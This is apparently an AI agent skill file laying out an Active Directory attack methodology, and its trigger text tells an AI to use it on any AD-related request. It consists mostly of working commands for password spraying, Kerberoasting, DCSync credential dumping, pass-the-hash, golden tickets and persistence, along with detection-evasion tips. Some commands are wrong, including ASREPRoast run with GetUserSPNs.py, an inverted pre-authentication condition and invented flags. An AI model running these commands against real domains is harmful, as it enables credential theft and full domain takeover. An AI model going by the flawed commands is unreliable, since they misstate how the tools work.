---
name: active-directory-pentest
description: Use this skill whenever you need to enumerate, attack, or escalate privileges in an Active Directory environment. Trigger on any AD-related tasks including reconnaissance, credential attacks, Kerberos abuse, trust exploitation, privilege escalation, or post-exploitation. Make sure to use this skill when the user mentions Active Directory, domain enumeration, Kerberos attacks, AD pentesting, Windows domain security, or any AD attack methodology.
---

# Active Directory Pentest Methodology

A comprehensive guide for Active Directory penetration testing, from initial reconnaissance to domain compromise and forest-wide escalation.

## Quick Reference

**When to use this skill:**
- Enumerating Active Directory domains
- Performing Kerberos-based attacks (Kerberoast, ASREPRoast, etc.)
- Escalating privileges in AD environments
- Exploiting domain trusts
- Post-exploitation with domain credentials
- LDAP-based AD abuse

**Key tools mentioned:**
- `crackmapexec` / `netexec` - SMB/WinRM enumeration
- `bloodhound` - AD relationship mapping
- `rubeus` - Kerberos ticket manipulation
- `secretsdump.py` - DCSync attacks
- `hashcat` - Password cracking
- `powerview` - PowerShell AD enumeration

---

## Phase 1: Reconnaissance (No Credentials)

### Network Discovery

```bash
# DNS enumeration for key servers
gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt

# SMB null/guest access (older Windows)
enum4linux -a -u "" -p "" <DC_IP>
smbmap -u "" -p "" -P 445 -H <DC_IP>
smbclient -U '%' -L //<DC_IP>

# LDAP enumeration
nmap -n -sV --script "ldap* and not brute" -p 389 <DC_IP>
```

### User Enumeration

```bash
# Kerbrute username enumeration
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt

# Nmap Kerberos enum
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>

# NetExec user enumeration
crackmapexec smb dominio.es -u '' -p '' --users | awk '{print $4}' | uniq

# NauthNRPC (no-auth MS-NRPC)
python3 nauth.py -t target -u users_file.txt
```

### Username Generation

Common AD username conventions:
- `NameSurname`, `Name.Surname`, `NamSur` (3 letters each)
- `Nam.Sur`, `NSurname`, `N.Surname`
- `SurnameName`, `Surname.Name`, `SurnameN`
- `abc123` (3 random letters + 3 random numbers)

Tools:
- `w0Tx/generate-ad-username`
- `urbanadventurer/username-anarchy`
- `namemash.py` - Generate from full names

---

## Phase 2: With Valid Username (No Password)

### ASREPRoast

If user doesn't have `DONT_REQ_PREAUTH`:

```bash
# Request AS-REP for offline cracking
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile asreproast

# Crack with hashcat
hashcat -m 18200 asreproast.txt wordlist.txt
```

### Password Spraying

```bash
# NetExec password spray
netexec smb <dc> -u usernames.txt -p 'Summer2021' --no-bruteforce --continue-on-success

# OWA password spray
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
```

### LLMNR/NBT-NS Poisoning

```bash
# Responder for credential capture
responder -I <interface> -wv

# Evil-S for UPN/SSDP spoofing
evil-s -i <interface>
```

---

## Phase 3: With Domain Credentials

### Basic Enumeration

```bash
# Windows CMD
net user /domain
net group /domain
net group "domain admins" /domain

# PowerShell
Get-DomainUser
Get-DomainGroup
Get-DomainGroupMember "Domain Admins"

# NetExec
netexec smb <dc> -u <user> -p <password>
netexec ldap <dc> -u <user> -p <password>
```

### BloodHound Enumeration

```bash
# SharpHound collection
SharpHound.exe -c All -d <domain>

# Or with Python
python3 SharpHound.py -c All -d <domain>

# Analyze in BloodHound GUI or Neo4j
```

### Kerberoast

```bash
# Request service tickets
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile kerberoast

# Crack RC4 tickets
hashcat -m 13100 kerberoast.txt wordlist.txt

# Or with hashcat NT-candidate mode (mode 35300)
hashcat -m 35300 kerberoast.txt nt_hashes.txt
```

### NetExec Workspace Management

```bash
# Create workspace for engagement
nxcdb workspace create <engagement_name>

# Switch protocols
nxcdb proto smb
nxcdb proto ldap

# View gathered credentials
nxcdb creds

# Generate hosts file from scan
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

---

## Phase 4: Privilege Escalation

### Hash Extraction

```bash
# DCSync attack
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -outputfile smoke_dump

# Extract NT hashes
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_hashes.txt

# Local SAM dump
nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa
```

### Pass the Hash

```bash
# NetExec with hash
netexec smb <dc> -u <user> -H <nt_hash>

# Mimikatz PTH
mimikatz # sekurlsa::pth /user:<user> /ntlm:<hash> /run:cmd.exe
```

### Over Pass the Hash (Kerberos)

```bash
# Rubeus Kerberos PTH
Rubeus.exe pth /user:<user> /ntlm:<hash> /runascurrent

# Request TGT with hash
Rubeus.exe asktgt /user:<user> /rc4:<hash> /domain:<domain>
```

### Delegation Attacks

```bash
# Check for unconstrained delegation
Get-DomainComputer -Unconstrained

# Check for constrained delegation
Get-DomainComputer -TrustedToAuth

# Resource-based constrained delegation
Get-DomainComputer -RBDC
```

### ACL Abuse

```bash
# Find writable objects
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "WriteDACL"}

# Check for dangerous permissions
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.AceFlags -eq "Inherited" -and $_.ActiveDirectoryRights -eq "GenericAll"}
```

---

## Phase 5: Domain Trust Exploitation

### Enumerate Trusts

```bash
# PowerShell
Get-DomainTrust

# nltest
nltest /domain_trusts /all_trusts /v
nltest /dclist:<domain>

# Check trust direction
# Inbound = your domain is trusted
# Outbound = you trust another domain
```

### Trust Attack Paths

**Inbound Trust (your domain is trusted):**
- Find principals with access to external domain
- Exploit foreign security principals
- Use `Get-DomainForeignUser` / `Get-DomainForeignGroupMember`

**Outbound Trust (you trust another domain):**
- Access trust account with predictable name/password
- Exploit SQL trusted links
- RDPInception attacks

**Child-to-Parent Escalation:**
- SID-History injection
- Exploit writable Configuration NC
- Link GPO to root DC site
- Compromise gMSA passwords via KDS Root key

---

## Phase 6: Post-Exploitation

### DCSync / NTDS Dump

```bash
# Full domain dump
secretsdump.py <domain>/<user>@<dc_ip> -history -outputfile full_dump

# Or with Impacket
impacket-secretsdump <domain>/<user>@<dc_ip>
```

### Persistence Techniques

```bash
# Make user Kerberoastable
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}

# Make user ASREPRoastable
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}

# Grant DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity <user> -Rights DCSync
```

### Golden/Silver Tickets

```bash
# Golden Ticket (requires krbtgt hash)
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:<domain_sid> /krbtgt:<hash>

# Silver Ticket (requires service hash)
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:<domain_sid> /target:<server> /service:cifs /rc4:<hash>
```

---

## Hash Shucking (NT-Candidate Attacks)

Use existing NT hashes as candidates for other hash types:

| Hash Type | Password Mode | NT-Candidate Mode |
|-----------|---------------|-------------------|
| DCC | 1100 | 31500 |
| DCC2 | 2100 | 31600 |
| NetNTLMv1 | 5500 | 27000 |
| NetNTLMv2 | 5600 | 27100 |
| Kerberoast RC4 | 13100 | 35300 |
| AS-REP RC4 | 18200 | 35400 |

```bash
# Build NT hash corpus
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt

# Shuck Kerberoast ticket
hashcat -m 35300 roastable_TGS nt_candidates.txt

# Shuck cached credentials
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

---

## LDAP-Based AD Abuse (On-Host)

Using LDAP BOF Collection for in-memory operations:

```bash
# Clone and build
git clone https://github.com/P0142/ldap-bof-collection.git
cd ldap-bof-collection && make

# Load in beacon
load ldap.axs

# Enumeration
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"

# Write operations
ldap add-user <username> <password>
ldap add-spn <user> <spn>
ldap add-sidhistory <user> <sid>
ldap add-dcsync <user>
```

---

## Defensive Considerations

### What to Check For

- **SMB Signing**: `netexec smb <cidr>` - look for `(signing:False)` = relay-prone
- **LDAP Signing**: `netexec ldap <dc>` - check for `(signing:None)`
- **LAPS**: Local Admin Password Solution mitigates credential reuse
- **Kerberos Pre-Auth**: Check for `DONT_REQ_PREAUTH` users
- **Delegation**: Audit unconstrained/constrained delegation settings

### Detection Evasion

- Use LDAPS (636) instead of LDAP (389) when possible
- Avoid session enumeration on DCs (triggers ATA)
- Use AES keys for tickets instead of NTLM
- Execute DCSync from non-DC machines
- Clean up workspaces: `rm -rf ~/.nxc/workspaces/<name>`

---

## Quick Command Reference

```bash
# User enumeration
kerbrute userenum -d <domain> --dc <dc_ip> usernames.txt

# Password spray
netexec smb <dc> -u users.txt -p 'Password1' --no-bruteforce

# Kerberoast
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile tickets

# DCSync
secretsdump.py <domain>/<user>@<dc_ip>

# BloodHound
SharpHound.exe -c All -d <domain>

# Hashcat modes
# 13100 = Kerberoast, 18200 = ASREPRoast
# 35300 = Kerberoast NT-candidate, 35400 = AS-REP NT-candidate
```

---

## Important Notes

1. **Kerberos requires FQDN** - Using IP addresses forces NTLM authentication
2. **Double-hop problem** - Kerberos tickets don't forward by default; use `runas /savecred` or Impacket tools
3. **History matters** - Always request password history with DCSync (up to 24 previous hashes)
4. **NT-candidate modes** - Don't use rules (`-r`) with NT-candidate modes; they corrupt the hash
5. **Workspace cleanup** - Remove sensitive data from NetExec workspaces after engagement

---

## References

- [HackTricks AD Methodology](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [Impacket Tools](https://github.com/fortra/impacket)
- [Hashcat Modes](https://hashcat.net/wiki/doku.php?id=modes)
- [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection)
